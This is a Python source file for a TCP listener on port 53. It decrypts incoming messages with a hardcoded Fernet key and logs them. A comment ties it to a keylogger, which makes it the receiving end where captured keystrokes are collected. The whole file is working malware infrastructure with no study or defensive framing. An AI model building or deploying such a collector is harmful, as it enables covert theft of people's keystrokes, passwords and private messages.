import socket
import logging
from cryptography.fernet import Fernet

# Initialize logging
logging.basicConfig(filename='server.log', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration
SERVER_ADDRESS = ('127.0.0.1', 53)
# Replace with the same key used in the keylogger
ENCRYPTION_KEY = 'b-cAg-xe8OS8kIn1FU-_g1vzwfCvOEzPIrHbMNLA_CI='
cipher = Fernet(ENCRYPTION_KEY)


def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(SERVER_ADDRESS)
        server_socket.listen(5)
        logging.info(f'Server started on {
                     SERVER_ADDRESS[0]}:{SERVER_ADDRESS[1]}')

        while True:
            client_socket, client_address = server_socket.accept()
            with client_socket:
                logging.info(f'Connection from {client_address}')
                try:
                    data = client_socket.recv(1024)
                    if data:
                        decrypted_data = cipher.decrypt(data).decode()
                        logging.info(f'Received data: {decrypted_data}')
                        print(decrypted_data)
                except Exception as e:
                    logging.error(f'Error receiving data: {e}')


if __name__ == '__main__':
    try:
        start_server()
    except KeyboardInterrupt:
        logging.info('Server terminated by user.')
    except Exception as e:
        logging.error(f'Unexpected error: {e}')
